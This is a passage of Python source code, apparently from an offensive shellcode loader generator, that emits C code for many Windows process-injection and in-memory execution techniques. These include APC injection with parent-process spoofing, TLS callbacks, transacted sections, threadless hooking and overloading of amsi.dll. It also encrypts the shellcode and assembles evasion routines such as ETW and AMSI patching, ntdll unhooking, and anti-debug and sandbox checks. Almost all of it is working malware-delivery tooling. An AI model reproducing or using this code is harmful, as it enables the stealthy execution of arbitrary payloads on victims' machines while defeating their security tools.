        lines.append("    UpdateProcThreadAttribute(%s.lpAttributeList, 0, PROC_THREAD_ATTRIBUTE_PARENT_PROCESS, &%s, sizeof(HANDLE), NULL, NULL);" % (sie, hp))
        lines.append("    PROCESS_INFORMATION %s;" % pi)
        lines.append("    memset(&%s, 0, sizeof(%s));" % (pi, pi))
        lines.append("    if (!%s(%s, NULL, NULL, NULL, FALSE, CREATE_SUSPENDED | EXTENDED_STARTUPINFO_PRESENT, NULL, NULL, &%s.StartupInfo, &%s)) {" % (p['CreateProcessA'], tgt, sie, pi))
        lines.append("        DeleteProcThreadAttributeList(%s.lpAttributeList);" % sie)
        lines.append("        HeapFree(GetProcessHeap(), 0, %s.lpAttributeList);" % sie)
        lines.append("        %s(%s);" % (p['CloseHandle'], hp))
        lines.append("        return;")
        lines.append("    }")
    else:
        hp = None
        sie = None
        si = rand_id(8)
        lines.append("    STARTUPINFOA %s;" % si)
        lines.append("    PROCESS_INFORMATION %s;" % pi)
        lines.append("    memset(&%s, 0, sizeof(%s));" % (si, si))
        lines.append("    memset(&%s, 0, sizeof(%s));" % (pi, pi))
        lines.append("    %s.cb = sizeof(%s);" % (si, si))
        lines.append("    if (!%s(%s, NULL, NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, &%s, &%s)) return;" % (
            p['CreateProcessA'], tgt, si, pi))

    if cmdline_spoof_fn:
        lines.append("    %s(%s.hProcess);" % (cmdline_spoof_fn, pi))
    lines.append("    void* %s = %s(%s.hProcess, NULL, %s, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);" % (m, p['VirtualAllocEx'], pi, l))
    lines.append("    if (!%s) { %s(%s.hProcess, 0); %s(%s.hThread); %s(%s.hProcess);" % (
        m, p['TerminateProcess'], pi, p['CloseHandle'], pi, p['CloseHandle'], pi))
    if ppid_spoof and sie:
        lines.append("        DeleteProcThreadAttributeList(%s.lpAttributeList); HeapFree(GetProcessHeap(), 0, %s.lpAttributeList); %s(%s);" % (sie, sie, p['CloseHandle'], hp))
    lines.append("        return; }")
    lines.append("    if (!%s(%s.hProcess, %s, %s, %s, NULL)) { %s(%s.hProcess, 0); %s(%s.hThread); %s(%s.hProcess);" % (p['WriteProcessMemory'], pi, m, s, l, p['TerminateProcess'], pi, p['CloseHandle'], pi, p['CloseHandle'], pi))
    if ppid_spoof and sie:
        lines.append("        DeleteProcThreadAttributeList(%s.lpAttributeList); HeapFree(GetProcessHeap(), 0, %s.lpAttributeList); %s(%s);" % (sie, sie, p['CloseHandle'], hp))
    lines.append("        return; }")
    lines.append("    DWORD %s;" % o)
    lines.append("    if (!%s(%s.hProcess, %s, %s, PAGE_EXECUTE_READ, &%s)) { %s(%s.hProcess, 0); %s(%s.hThread); %s(%s.hProcess);" % (p['VirtualProtectEx'], pi, m, l, o, p['TerminateProcess'], pi, p['CloseHandle'], pi, p['CloseHandle'], pi))
    if ppid_spoof and sie:
        lines.append("        DeleteProcThreadAttributeList(%s.lpAttributeList); HeapFree(GetProcessHeap(), 0, %s.lpAttributeList); %s(%s);" % (sie, sie, p['CloseHandle'], hp))
    lines.append("        return; }")
    if junk: lines.append(gen_junk_block())
    lines.append("    %s((PAPCFUNC)%s, %s.hThread, 0);" % (p['QueueUserAPC'], m, pi))
    lines.append("    %s(%s.hThread);" % (p['ResumeThread'], pi))
    lines.append("    %s(%s.hThread);" % (p['CloseHandle'], pi))
    lines.append("    %s(%s.hProcess);" % (p['CloseHandle'], pi))
    if ppid_spoof and sie:
        lines.append("    DeleteProcThreadAttributeList(%s.lpAttributeList);" % sie)
        lines.append("    HeapFree(GetProcessHeap(), 0, %s.lpAttributeList);" % sie)
        lines.append("    %s(%s);" % (p['CloseHandle'], hp))
    lines.append("}")
    return fn, "\n".join(lines)

def gen_mapview(resolve_fn, junk=True, syscall_map=None, sleep_base=None, sleep_size=None, cfg_fn=None):
    fn = rand_id()
    s, l = rand_id(), rand_id()
    hm = rand_id(8)
    base = rand_id(8)
    th = rand_id(8)
    rounded = rand_id(6)
    p, rc = _multi_resolve(resolve_fn, [
        'CreateFileMappingA', 'MapViewOfFile', 'CreateThread',
        'WaitForSingleObject', 'UnmapViewOfFile', 'CloseHandle'], syscall_map)
    lines = ["void %s(unsigned char* %s, unsigned int %s) {" % (fn, s, l)]
    lines.extend(rc)
    if junk: lines.append(gen_junk_block())
    lines.append("    SIZE_T %s = (%s + 0xFFF) & ~(SIZE_T)0xFFF;" % (rounded, l))
    lines.append("    HANDLE %s = %s(INVALID_HANDLE_VALUE, NULL, PAGE_EXECUTE_READWRITE, 0, (DWORD)%s, NULL);" % (hm, p['CreateFileMappingA'], rounded))
    lines.append("    if (!%s) return;" % hm)
    lines.append("    void* %s = %s(%s, FILE_MAP_WRITE | FILE_MAP_EXECUTE, 0, 0, %s);" % (base, p['MapViewOfFile'], hm, rounded))
    lines.append("    if (!%s) { %s(%s); return; }" % (base, p['CloseHandle'], hm))
    lines.append("    memcpy(%s, %s, %s);" % (base, s, l))
    if junk: lines.append(gen_junk_block())
    if cfg_fn:
        lines.append("    %s(%s, %s);" % (cfg_fn, base, rounded))
    lines.append("    HANDLE %s = %s(NULL, 0, (LPTHREAD_START_ROUTINE)%s, NULL, 0, NULL);" % (th, p['CreateThread'], base))
    lines.append("    if (!%s) { %s(%s); %s(%s); return; }" % (th, p['UnmapViewOfFile'], base, p['CloseHandle'], hm))
    if sleep_base:
        lines.append("    %s = %s;" % (sleep_base, base))
        lines.append("    %s = %s;" % (sleep_size, rounded))
    else:
        lines.append("    %s(%s, 0xFFFFFFFF);" % (p['WaitForSingleObject'], th))
        lines.append("    %s(%s);" % (p['UnmapViewOfFile'], base))
        lines.append("    %s(%s);" % (p['CloseHandle'], hm))
    lines.append("}")
    return fn, "\n".join(lines)

def gen_tls(resolve_fn, junk=True, syscall_map=None, sleep_base=None, sleep_size=None, cfg_fn=None):
    fn = rand_id()
    cb_fn = rand_id()
    s, l = rand_id(), rand_id()
    m = rand_id(8)
    o = rand_id(6)
    p, rc = _multi_resolve(resolve_fn, ['VirtualAlloc', 'VirtualProtect', 'CreateThread', 'CloseHandle'], syscall_map)
    g_buf = rand_id(8)
    g_sz = rand_id(8)
    g_rdy = rand_id(8)
    dummy_fn = rand_id()
    tls_cb = "static unsigned char* %s = NULL;\n" % g_buf
    tls_cb += "static unsigned int %s = 0;\n" % g_sz
    tls_cb += "static volatile int %s = 0;\n\n" % g_rdy
    tls_cb += "static DWORD WINAPI %s(LPVOID p) { return 0; }\n\n" % dummy_fn
    tls_cb += "static void NTAPI %s(PVOID DllHandle, DWORD Reason, PVOID Reserved) {\n" % cb_fn
    tls_cb += "    if (Reason != 2 || !%s || !%s) return;\n" % (g_buf, g_rdy)
    tls_cb += "    ((void(*)())%s)();\n" % g_buf
    tls_cb += "}\n\n"
    tls_cb += "#ifdef _MSC_VER\n"
    tls_cb += "#pragma comment(linker, \"/INCLUDE:_tls_used\")\n"
    tls_cb += "#pragma const_seg(\".CRT$XLB\")\n"
    tls_cb += "const PIMAGE_TLS_CALLBACK %s = %s;\n" % (rand_id(8), cb_fn)
    tls_cb += "#pragma const_seg()\n"
    tls_cb += "#else\n"
    tls_cb += "__attribute__((section(\".CRT$XLB\"))) PIMAGE_TLS_CALLBACK %s = %s;\n" % (rand_id(8), cb_fn)
    tls_cb += "#endif\n"
    lines = [tls_cb, "void %s(unsigned char* %s, unsigned int %s) {" % (fn, s, l)]
    lines.extend(rc)
    if junk: lines.append(gen_junk_block())
    lines.append("    void* %s = %s(NULL, %s, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);" % (m, p['VirtualAlloc'], l))
    lines.append("    if (!%s) return;" % m)
    lines.append("    memcpy(%s, %s, %s);" % (m, s, l))
    lines.append("    DWORD %s;" % o)
    lines.append("    %s(%s, %s, PAGE_EXECUTE_READ, &%s);" % (p['VirtualProtect'], m, l, o))
    if cfg_fn:
        lines.append("    %s(%s, %s);" % (cfg_fn, m, l))
    lines.append("    %s = (unsigned char*)%s;" % (g_buf, m))
    lines.append("    %s = %s;" % (g_sz, l))
    if sleep_base:
        lines.append("    %s = %s;" % (sleep_base, m))
        lines.append("    %s = %s;" % (sleep_size, l))
    lines.append("    %s = 1;" % g_rdy)
    th_v = rand_id(6)
    lines.append("    HANDLE %s = %s(NULL, 0, %s, NULL, 0, NULL);" % (th_v, p['CreateThread'], dummy_fn))
    lines.append("    if (%s) { WaitForSingleObject(%s, INFINITE); %s(%s); }" % (th_v, th_v, p['CloseHandle'], th_v))
    lines.append("}")
    return fn, "\n".join(lines)

def gen_transact(resolve_fn, junk=True, syscall_map=None, sleep_base=None, sleep_size=None, cfg_fn=None):
    fn = rand_id()
    s, l = rand_id(), rand_id()
    ptr_nct, r_nct = gen_resolve_raw(resolve_fn, "ntdll.dll", "NtCreateTransaction")
    ptr_nrt, r_nrt = gen_resolve_raw(resolve_fn, "ntdll.dll", "NtRollbackTransaction")
    ptr_ncs, r_ncs = gen_resolve_raw(resolve_fn, "ntdll.dll", "NtCreateSection")
    ptr_nmvos, r_nmvos = gen_resolve_raw(resolve_fn, "ntdll.dll", "NtMapViewOfSection")
    ptr_nc, r_nc = gen_resolve_raw(resolve_fn, "ntdll.dll", "NtClose")
    td_nct = rand_id(8)
    td_nrt = rand_id(8)
    td_ncs = rand_id(8)
    td_nmvos = rand_id(8)
    td_nc = rand_id(8)
    htx = rand_id(8)
    hf = rand_id(8)
    hsec = rand_id(8)
    rx_base = rand_id(8)
    vw_sz = rand_id(6)
    st = rand_id(6)
    tmpd = rand_id(6)
    tmpf = rand_id(6)
    wb = rand_id(6)
    rounded = rand_id(6)
    th = rand_id(8)
    p, rc = _multi_resolve(resolve_fn, [
        'CreateFileTransactedA', 'WriteFile', 'GetTempPathA',
        'CloseHandle', 'CreateThread', 'WaitForSingleObject', 'DeleteFileA'], syscall_map)
    lines = ["void %s(unsigned char* %s, unsigned int %s) {" % (fn, s, l)]
    lines.append(r_nct)
    lines.append(r_nrt)
    lines.append(r_ncs)
    lines.append(r_nmvos)
    lines.append(r_nc)
    lines.extend(rc)
    lines.append("    typedef LONG (NTAPI* %s)(PHANDLE,ACCESS_MASK,void*,void*,void*,ULONG,ULONG,ULONG,ULONG,void*,ULONG);" % td_nct)
    lines.append("    typedef LONG (NTAPI* %s)(HANDLE,BOOLEAN);" % td_nrt)
    lines.append("    typedef LONG (NTAPI* %s)(PHANDLE,ACCESS_MASK,void*,PLARGE_INTEGER,ULONG,ULONG,HANDLE);" % td_ncs)
    lines.append("    typedef LONG (NTAPI* %s)(HANDLE,HANDLE,PVOID*,ULONG_PTR,SIZE_T,PLARGE_INTEGER,PSIZE_T,ULONG,ULONG,ULONG);" % td_nmvos)
    lines.append("    typedef LONG (NTAPI* %s)(HANDLE);" % td_nc)
    lines.append("    if (!%s || !%s || !%s || !%s || !%s) return;" % (ptr_nct, ptr_nrt, ptr_ncs, ptr_nmvos, ptr_nc))
    if junk: lines.append(gen_junk_block())
    lines.append("    HANDLE %s = NULL;" % htx)
    lines.append("    LONG %s = ((%s)%s)(&%s, 0x000F01FFu, NULL, NULL, NULL, 0, 0, 0, 0, NULL, 0);" % (st, td_nct, ptr_nct, htx))
    lines.append("    if (%s < 0 || !%s) return;" % (st, htx))
    lines.append("    char %s[MAX_PATH];" % tmpd)
    lines.append("    %s(MAX_PATH, %s);" % (p['GetTempPathA'], tmpd))
    lines.append("    char %s[MAX_PATH];" % tmpf)
    lines.append("    wsprintfA(%s, \"%%s%%08x.tmp\", %s, (unsigned)%s ^ 0x%xu);" % (tmpf, tmpd, l, random.randint(0x10000, 0xFFFFF)))
    if junk: lines.append(gen_junk_block())
    lines.append("    HANDLE %s = %s(%s, GENERIC_WRITE | GENERIC_READ, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL, %s, NULL, NULL);" % (hf, p['CreateFileTransactedA'], tmpf, htx))
    lines.append("    if (%s == INVALID_HANDLE_VALUE) { ((%s)%s)(%s); return; }" % (hf, td_nc, ptr_nc, htx))
    lines.append("    DWORD %s = 0;" % wb)
    lines.append("    if (!%s(%s, %s, %s, &%s, NULL)) { %s(%s); ((%s)%s)(%s); return; }" % (p['WriteFile'], hf, s, l, wb, p['CloseHandle'], hf, td_nc, ptr_nc, htx))
    if junk: lines.append(gen_junk_block())
    lines.append("    SIZE_T %s = (%s + 0xFFF) & ~(SIZE_T)0xFFF;" % (rounded, l))
    lines.append("    HANDLE %s = NULL;" % hsec)
    lines.append("    LARGE_INTEGER %s_sz;" % hsec)
    lines.append("    %s_sz.QuadPart = %s;" % (hsec, rounded))
    lines.append("    %s = ((%s)%s)(&%s, 0x000F001Fu, NULL, &%s_sz, PAGE_READONLY, SEC_IMAGE_NO_EXECUTE, %s);" % (st, td_ncs, ptr_ncs, hsec, hsec, hf))
    lines.append("    if (%s < 0) {" % st)
    lines.append("        %s_sz.QuadPart = %s;" % (hsec, rounded))
    lines.append("        %s = ((%s)%s)(&%s, 0x000F001Fu, NULL, &%s_sz, PAGE_EXECUTE_READWRITE, SEC_COMMIT, %s);" % (st, td_ncs, ptr_ncs, hsec, hsec, hf))
    lines.append("    }")
    lines.append("    %s(%s);" % (p['CloseHandle'], hf))
    lines.append("    ((%s)%s)(%s, FALSE);" % (td_nrt, ptr_nrt, htx))
    lines.append("    ((%s)%s)(%s);" % (td_nc, ptr_nc, htx))
    lines.append("    %s(%s);" % (p['DeleteFileA'], tmpf))
    lines.append("    if (%s < 0 || !%s) return;" % (st, hsec))
    lines.append("    void* %s = NULL;" % rx_base)
    lines.append("    SIZE_T %s = 0;" % vw_sz)
    lines.append("    %s = ((%s)%s)(%s, (HANDLE)-1, &%s, 0, 0, NULL, &%s, 1, 0, PAGE_EXECUTE_READ);" % (st, td_nmvos, ptr_nmvos, hsec, rx_base, vw_sz))
    lines.append("    if (%s < 0 || !%s) { ((%s)%s)(%s); return; }" % (st, rx_base, td_nc, ptr_nc, hsec))
    if cfg_fn:
        lines.append("    %s(%s, %s);" % (cfg_fn, rx_base, rounded))
    lines.append("    HANDLE %s = %s(NULL, 0, (LPTHREAD_START_ROUTINE)%s, NULL, 0, NULL);" % (th, p['CreateThread'], rx_base))
    lines.append("    if (!%s) { ((%s)%s)(%s); return; }" % (th, td_nc, ptr_nc, hsec))
    if sleep_base:
        lines.append("    %s = %s;" % (sleep_base, rx_base))
        lines.append("    %s = %s;" % (sleep_size, rounded))
    else:
        lines.append("    %s(%s, 0xFFFFFFFF);" % (p['WaitForSingleObject'], th))
    lines.append("}")
    return fn, "\n".join(lines)


def gen_threadless(resolve_fn, junk=True, syscall_map=None, sleep_base=None, sleep_size=None):
    fn = rand_id()
    s, l, pv, h, m, o = [rand_id() for _ in range(6)]
    tramp = rand_id(8)
    orig = rand_id(8)
    hook = rand_id(8)
    exp_addr = rand_id(8)
    rip_off = rand_id(6)
    p, rc = _multi_resolve(resolve_fn, ['OpenProcess', 'VirtualAllocEx', 'WriteProcessMemory',
                                         'VirtualProtectEx', 'ReadProcessMemory', 'CloseHandle'], syscall_map)
    ptr_gpa, r_gpa = gen_resolve_raw(resolve_fn, "ntdll.dll", "NtWaitForSingleObject")
    lines = ["void %s(unsigned char* %s, unsigned int %s, DWORD %s) {" % (fn, s, l, pv)]
    lines.extend(rc)
    lines.append(r_gpa)
    if junk: lines.append(gen_junk_block())
    lines.append("    HANDLE %s = %s(PROCESS_ALL_ACCESS, FALSE, %s);" % (h, p['OpenProcess'], pv))
    lines.append("    if (!%s) return;" % h)
    lines.append("    void* %s = %s(%s, NULL, %s + 256, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);" % (m, p['VirtualAllocEx'], h, l))
    lines.append("    if (!%s) { %s(%s); return; }" % (m, p['CloseHandle'], h))
    lines.append("    if (!%s(%s, %s, %s, %s, NULL)) { %s(%s); return; }" % (p['WriteProcessMemory'], h, m, s, l, p['CloseHandle'], h))
    lines.append("    DWORD %s;" % o)
    lines.append("    %s(%s, %s, %s, PAGE_EXECUTE_READ, &%s);" % (p['VirtualProtectEx'], h, m, l, o))
    if junk: lines.append(gen_junk_block())
    lines.append("    unsigned char* %s = %s;" % (exp_addr, ptr_gpa))
    lines.append("    if (!%s) { %s(%s); return; }" % (exp_addr, p['CloseHandle'], h))
    lines.append("    unsigned char %s[8];" % orig)
    lines.append("    if (!%s(%s, %s, %s, 8, NULL)) { %s(%s); return; }" % (p['ReadProcessMemory'], h, exp_addr, orig, p['CloseHandle'], h))
    lines.append("    unsigned char %s[14];" % hook)
    lines.append("    %s[0] = 0xFF; %s[1] = 0x25; *(DWORD*)(&%s[2]) = 0; *(ULONG_PTR*)(&%s[6]) = (ULONG_PTR)%s;" % (hook, hook, hook, hook, m))
    lines.append("    unsigned char %s[256];" % tramp)
    lines.append("    memcpy(%s, %s, 8);" % (tramp, orig))
    lines.append("    %s[8] = 0xFF; %s[9] = 0x25; *(DWORD*)(&%s[10]) = 0; *(ULONG_PTR*)(&%s[14]) = (ULONG_PTR)(%s + 8);" % (tramp, tramp, tramp, tramp, exp_addr))
    lines.append("    void* %s = (unsigned char*)%s + %s;" % (rip_off, m, l))
    lines.append("    %s(%s, %s, %s, 22, NULL);" % (p['WriteProcessMemory'], h, rip_off, tramp))
    lines.append("    DWORD %s_op;" % rip_off)
    lines.append("    %s(%s, %s, 22, PAGE_EXECUTE_READ, &%s_op);" % (p['VirtualProtectEx'], h, rip_off, rip_off))
    lines.append("    %s(%s, %s, %s, sizeof(%s), NULL);" % (p['WriteProcessMemory'], h, exp_addr, hook, hook))
    lines.append("    %s(%s);" % (p['CloseHandle'], h))
    lines.append("}")
    return fn, "\n".join(lines)

def gen_overload(resolve_fn, junk=True, syscall_map=None, sleep_base=None, sleep_size=None, cfg_fn=None):
    fn = rand_id()
    s, l = rand_id(), rand_id()
    hf = rand_id(8)
    hm = rand_id(8)
    mb = rand_id(8)
    dh = rand_id(8)
    nh = rand_id(8)
    sec = rand_id(8)
    iv = rand_id(6)
    txt = rand_id(8)
    sz = rand_id(6)
    o = rand_id(6)
    th = rand_id(8)
    dll_path = rand_id(8)
    p, rc = _multi_resolve(resolve_fn, ['LoadLibraryExA', 'VirtualProtect', 'CreateThread',
                                         'WaitForSingleObject', 'GetSystemDirectoryA'], syscall_map)
    lines = ["void %s(unsigned char* %s, unsigned int %s) {" % (fn, s, l)]
    lines.extend(rc)
    if junk: lines.append(gen_junk_block())
    lines.append("    char %s[MAX_PATH];" % dll_path)
    lines.append("    %s(%s, MAX_PATH);" % (p['GetSystemDirectoryA'], dll_path))
    amsi_dll = "\\\\amsi.dll"
    lines.append("    int %s_l = 0; while (%s[%s_l]) %s_l++;" % (dll_path, dll_path, dll_path, dll_path))
    for i, c in enumerate(amsi_dll):
        lines.append("    %s[%s_l + %d] = %d;" % (dll_path, dll_path, i, ord(c)))
    lines.append("    %s[%s_l + %d] = 0;" % (dll_path, dll_path, len(amsi_dll)))
    lines.append("    HMODULE %s = %s(%s, NULL, 0x00000001);" % (hf, p['LoadLibraryExA'], dll_path))
    lines.append("    if (!%s) return;" % hf)
    lines.append("    PIMAGE_DOS_HEADER %s = (PIMAGE_DOS_HEADER)%s;" % (dh, hf))
    lines.append("    PIMAGE_NT_HEADERS %s = (PIMAGE_NT_HEADERS)((unsigned char*)%s + %s->e_lfanew);" % (nh, hf, dh))
    lines.append("    PIMAGE_SECTION_HEADER %s = IMAGE_FIRST_SECTION(%s);" % (sec, nh))
    lines.append("    unsigned char* %s = NULL; DWORD %s = 0;" % (txt, sz))
    lines.append("    for (int %s = 0; %s < %s->FileHeader.NumberOfSections; %s++) {" % (iv, iv, nh, iv))
    lines.append("        if (%s[%s].Characteristics & IMAGE_SCN_MEM_EXECUTE) { %s = (unsigned char*)%s + %s[%s].VirtualAddress; %s = %s[%s].Misc.VirtualSize; break; }" % (sec, iv, txt, hf, sec, iv, sz, sec, iv))
    lines.append("    }")
    lines.append("    if (!%s || %s < %s) return;" % (txt, sz, l))
    lines.append("    DWORD %s;" % o)
    lines.append("    if (!%s(%s, %s, PAGE_READWRITE, &%s)) return;" % (p['VirtualProtect'], txt, sz, o))
    lines.append("    memcpy(%s, %s, %s);" % (txt, s, l))
    lines.append("    %s(%s, %s, PAGE_EXECUTE_READ, &%s);" % (p['VirtualProtect'], txt, sz, o))
    if cfg_fn:
        lines.append("    %s(%s, %s);" % (cfg_fn, txt, l))
    if junk: lines.append(gen_junk_block())
    lines.append("    HANDLE %s = %s(NULL, 0, (LPTHREAD_START_ROUTINE)%s, NULL, 0, NULL);" % (th, p['CreateThread'], txt))
    lines.append("    if (!%s) return;" % th)
    if sleep_base:
        lines.append("    %s = %s;" % (sleep_base, txt))
        lines.append("    %s = %s;" % (sleep_size, sz))
    else:
        lines.append("    %s(%s, 0xFFFFFFFF);" % (p['WaitForSingleObject'], th))
    lines.append("}")
    return fn, "\n".join(lines)

def gen_callbackfonts(resolve_fn, junk=True, syscall_map=None, sleep_base=None, sleep_size=None, cfg_fn=None):
    fn = rand_id()
    s, l, m, o = [rand_id() for _ in range(4)]
    hdc = rand_id(8)
    p, rc = _multi_resolve(resolve_fn, ['VirtualAlloc', 'VirtualProtect', 'EnumFontsW', 'GetDC', 'ReleaseDC'], syscall_map)
    lines = ["void %s(unsigned char* %s, unsigned int %s) {" % (fn, s, l)]
    lines.extend(rc)
    if junk: lines.append(gen_junk_block())
    lines.append("    void* %s = %s(NULL, %s, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);" % (m, p['VirtualAlloc'], l))
    lines.append("    if (!%s) return;" % m)
    lines.append("    memcpy(%s, %s, %s);" % (m, s, l))
    lines.append("    DWORD %s;" % o)
    lines.append("    if (!%s(%s, %s, PAGE_EXECUTE_READ, &%s)) return;" % (p['VirtualProtect'], m, l, o))
    if cfg_fn:
        lines.append("    %s(%s, %s);" % (cfg_fn, m, l))
    lines.append("    HDC %s = %s(NULL);" % (hdc, p['GetDC']))
    lines.append("    %s(%s, NULL, (void*)%s, 0);" % (p['EnumFontsW'], hdc, m))
    lines.append("    %s(NULL, %s);" % (p['ReleaseDC'], hdc))
    if sleep_base:
        lines.append("    %s = %s;" % (sleep_base, m))
        lines.append("    %s = %s;" % (sleep_size, l))
    lines.append("}")
    return fn, "\n".join(lines)

def gen_callbackdesktop(resolve_fn, junk=True, syscall_map=None, sleep_base=None, sleep_size=None, cfg_fn=None):
    fn = rand_id()
    s, l, m, o = [rand_id() for _ in range(4)]
    p, rc = _multi_resolve(resolve_fn, ['VirtualAlloc', 'VirtualProtect', 'EnumDesktopWindows'], syscall_map)
    lines = ["void %s(unsigned char* %s, unsigned int %s) {" % (fn, s, l)]
    lines.extend(rc)
    if junk: lines.append(gen_junk_block())
    lines.append("    void* %s = %s(NULL, %s, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);" % (m, p['VirtualAlloc'], l))
    lines.append("    if (!%s) return;" % m)
    lines.append("    memcpy(%s, %s, %s);" % (m, s, l))
    lines.append("    DWORD %s;" % o)
    lines.append("    if (!%s(%s, %s, PAGE_EXECUTE_READ, &%s)) return;" % (p['VirtualProtect'], m, l, o))
    if cfg_fn:
        lines.append("    %s(%s, %s);" % (cfg_fn, m, l))
    lines.append("    %s(NULL, (void*)%s, 0);" % (p['EnumDesktopWindows'], m))
    if sleep_base:
        lines.append("    %s = %s;" % (sleep_base, m))
        lines.append("    %s = %s;" % (sleep_size, l))
    lines.append("}")
    return fn, "\n".join(lines)

def gen_callbackwindows(resolve_fn, junk=True, syscall_map=None, sleep_base=None, sleep_size=None, cfg_fn=None):
    fn = rand_id()
    s, l, m, o = [rand_id() for _ in range(4)]
    p, rc = _multi_resolve(resolve_fn, ['VirtualAlloc', 'VirtualProtect', 'EnumWindows'], syscall_map)
    lines = ["void %s(unsigned char* %s, unsigned int %s) {" % (fn, s, l)]
    lines.extend(rc)
    if junk: lines.append(gen_junk_block())
    lines.append("    void* %s = %s(NULL, %s, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);" % (m, p['VirtualAlloc'], l))
    lines.append("    if (!%s) return;" % m)
    lines.append("    memcpy(%s, %s, %s);" % (m, s, l))
    lines.append("    DWORD %s;" % o)
    lines.append("    if (!%s(%s, %s, PAGE_EXECUTE_READ, &%s)) return;" % (p['VirtualProtect'], m, l, o))
    if cfg_fn:
        lines.append("    %s(%s, %s);" % (cfg_fn, m, l))
    lines.append("    %s((void*)%s, 0);" % (p['EnumWindows'], m))
    if sleep_base:
        lines.append("    %s = %s;" % (sleep_base, m))
        lines.append("    %s = %s;" % (sleep_size, l))
    lines.append("}")
    return fn, "\n".join(lines)

TECH_GEN = {
    'local': gen_local,
    'inject': gen_inject,
    'apc': gen_apc,
    'callback': gen_callback,
    'fiber': gen_fiber,
    'hijack': gen_hijack,
    'stomp': gen_stomp,
    'hollow': gen_hollow,
    'pool': gen_pool,
    'phantom': gen_phantom,
    'earlybird': gen_earlybird,
    'mapview': gen_mapview,
    'tls': gen_tls,
    'transact': gen_transact,
    'threadless': gen_threadless,
    'overload': gen_overload,
    'callbackfonts': gen_callbackfonts,
    'callbackdesktop': gen_callbackdesktop,
    'callbackwindows': gen_callbackwindows,
}

def _validate_input(args):
    if not os.path.isfile(args.input):
        print("[!] Shellcode file not found: %s" % args.input)
        sys.exit(1)
    fsize = os.path.getsize(args.input)
    if fsize == 0:
        print("[!] Shellcode file is empty")
        sys.exit(1)
    if fsize > MAX_SHELLCODE_SIZE:
        print("[!] Shellcode too large (%d bytes, max %d)" % (fsize, MAX_SHELLCODE_SIZE))
        sys.exit(1)
    try:
        test = secrets.token_bytes(16)
        if len(test) != 16 or test == bytes(16):
            raise RuntimeError("CSPRNG produced suspicious output")
    except Exception as e:
        print("[!] CSPRNG verification failed: %s" % e)
        sys.exit(1)
    with open(args.input, "rb") as f:
        return f.read()

def _encrypt_shellcode(shellcode, args, env_hash=None):
    key_material = bytearray(secrets.token_bytes(32))
    if args.encrypt == "aes":
        iv_bytes = secrets.token_bytes(16)
        encrypted = aes_encrypt(shellcode, bytes(key_material), iv_bytes)
        dec_fn, dec_code = gen_aes_decrypt()
        use_aes = True
    elif args.encrypt == "rc4":
        iv_bytes = None
        encrypted = rc4_crypt(shellcode, bytes(key_material))
        dec_fn, dec_code = gen_rc4_decrypt()
        use_aes = False
    else:
        iv_bytes = None
        encrypted = xor_bytes(shellcode, bytes(key_material))
        dec_fn, dec_code = gen_xor_decrypt()
        use_aes = False

    compound_key = None
    compound_dec_fn = None
    compound_dec_code = None
    if args.compound:
        ck_material = bytearray(secrets.token_bytes(32))
        encrypted = xor_bytes(encrypted, bytes(ck_material))
        compound_dec_fn, compound_dec_code = gen_xor_decrypt()
        compound_key = bytes(ck_material)
        for i in range(len(ck_material)):
            ck_material[i] = 0

    stored_key = bytearray(key_material)
    if env_hash is not None:
        for i in range(min(len(env_hash), len(stored_key))):
            stored_key[i] ^= env_hash[i]
    stored_key = bytes(stored_key)

    for i in range(len(key_material)):
        key_material[i] = 0

    return (encrypted, stored_key, iv_bytes, dec_fn, dec_code,
            use_aes, compound_key, compound_dec_fn, compound_dec_code)

def _build_includes(args, use_aes, ppid_spoof):
    inc = "#include <windows.h>\n#include <string.h>\n"
    info = TECHNIQUE_INFO[args.technique]
    if info['needs_pid'] or args.sandbox or ppid_spoof or args.technique == 'hijack':
        inc += "#include <tlhelp32.h>\n"
    if use_aes or getattr(args, 'hmac', False):
        inc += "#include <bcrypt.h>\n#pragma comment(lib, \"bcrypt\")\n"
    if getattr(args, 'anti_emulation', False) or getattr(args, 'retaddr_spoof', False):
        inc += "#ifdef _MSC_VER\n#include <intrin.h>\n#endif\n"
    return inc

def _build_evasion(resolve_fn, args, sc_map, exit_fn, sleep_fn):
    code_parts = []
    calls = []
    ra_begin = ""
    ra_end = ""
    if args.kill_date:
        parts = args.kill_date.split("-")
        kd_fn, kd_code = gen_kill_date(int(parts[0]), int(parts[1]), int(parts[2]), resolve_fn, exit_fn)
        code_parts.append(kd_code + "\n\n")
        calls.append("    %s();\n" % kd_fn)
    if args.guardrails:
        domain_hash = djb2_hash(args.guardrails)
        gr_fn, gr_code = gen_guardrails(domain_hash, resolve_fn, exit_fn)
        code_parts.append(gr_code + "\n\n")
        calls.append("    %s();\n" % gr_fn)
    if args.anti_debug:
        ad_fn, ad_code = gen_anti_debug(resolve_fn, exit_fn)
        code_parts.append(ad_code + "\n\n")
        calls.append("    %s();\n" % ad_fn)
    if args.sandbox:
        sb_fn, sb_code = gen_sandbox_check(resolve_fn, exit_fn, sleep_fn)
        code_parts.append(sb_code + "\n\n")
        calls.append("    %s();\n" % sb_fn)
    if args.hwbp and (args.patch_etw or args.patch_amsi):
        hwbp_fn, hwbp_code = gen_hwbp_bypass(resolve_fn, args.patch_amsi, args.patch_etw)
        code_parts.append(hwbp_code + "\n\n")
        calls.append("    %s();\n" % hwbp_fn)
    else:
        if args.patch_etw:
            etw_fn, etw_code = gen_patch_etw(resolve_fn)
            code_parts.append(etw_code + "\n\n")
            calls.append("    %s();\n" % etw_fn)
        if args.patch_amsi:
            amsi_fn, amsi_code = gen_patch_amsi(resolve_fn)
            code_parts.append(amsi_code + "\n\n")
            calls.append("    %s();\n" % amsi_fn)
    if args.unhook:
        uh_fn, uh_code = gen_unhook_ntdll(resolve_fn)
        code_parts.append(uh_code + "\n\n")
        calls.append("    %s();\n" % uh_fn)
    if getattr(args, 'anti_emulation', False):
        ae_fn, ae_code = gen_anti_emulation(resolve_fn, exit_fn)
        code_parts.append(ae_code + "\n\n")
        calls.append("    %s();\n" % ae_fn)
    if getattr(args, 'thread_hide', False):
        th_fn, th_code = gen_thread_hide(resolve_fn)
        code_parts.append(th_code + "\n\n")
